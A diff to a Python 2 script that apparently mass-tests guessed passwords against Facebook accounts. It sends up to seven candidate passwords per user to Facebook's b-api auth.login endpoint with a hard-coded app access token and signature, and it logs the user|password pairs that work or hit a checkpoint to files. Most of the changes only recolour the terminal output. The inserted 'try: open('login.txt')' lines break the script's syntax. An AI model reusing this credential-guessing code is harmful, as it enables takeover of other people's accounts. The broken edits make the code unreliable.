@@ -95,6 +95,8 @@ while (loop == 'true'):
             print "\033[1;97mAccess Granted "#Dev:Jam_Shahrukh
 	    time.sleep(1)
             loop = 'false'
+	try:
+		toket = open('login.txt','r')
         else:
             print "\033[1;97mACCESS DENIED"
             os.system('xdg-open https://www.facebook.com/ch.imran.7370')
@@ -102,6 +104,8 @@ while (loop == 'true'):
         print "\033[1;97mACCESS DENIED"
         os.system('xdg-open https://www.facebook.com/ch.imran.7370')
 def methodlogin():
+	try:
+		toket = open('login.txt','r')
 	os.system('clear')
 	print logo
 	print "[1] Login With ID/Password."
@@ -342,11 +346,11 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
+				print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
+					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
 					crt = open("save/checkpoint.txt", "a")
 					crt.write(user+"|"+pass1+"\n")
 					crt.close()
@@ -356,11 +360,11 @@ def pilih_super():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
-						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
+						print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
+							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
 							crt = open("save/checkpoint.txt", "a")
 							crt.write(user+"|"+pass2+"\n")
 							crt.close()
@@ -370,11 +374,11 @@ def pilih_super():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
-								print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass3
+								print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass3
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
+									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
 									crt = open("save/checkpoint.txt", "a")
 									crt.write(user+"|"+pass3+"\n")
 									crt.close()
@@ -384,11 +388,11 @@ def pilih_super():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
-										print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass4
+										print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass4
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
+											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
 											crt = open("save/checkpoint.txt", "a")
 											crt.write(user+"|"+pass4+"\n")
 											crt.close()
@@ -398,11 +402,11 @@ def pilih_super():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if "access_token" in q:
-												print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass5
+												print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass5
 												oks.append(user+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
+													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
 													crt = open("save/checkpoint.txt", "a")
 													crt.write(user+"|"+pass5+"\n")
 													crt.close()
@@ -412,11 +416,11 @@ def pilih_super():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
-														print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass6
+														print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass6
 														oks.append(user+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
+															print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
 															crt = open("save/checkpoint.txt", "a")
 															crt.write(user+"|"+pass6+"\n")
 															crt.close()
@@ -426,11 +430,11 @@ def pilih_super():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
-																print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass7
+																print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;92m]\x1b[1;92m ' + user + ' \x1b[1;92m|\x1b[1;92m ' + pass7
 																oks.append(user+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
+																	print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
 																	crt = open("save/checkpoint.txt", "a")
 																	crt.write(user+"|"+pass7+"\n")
 																	crt.close()
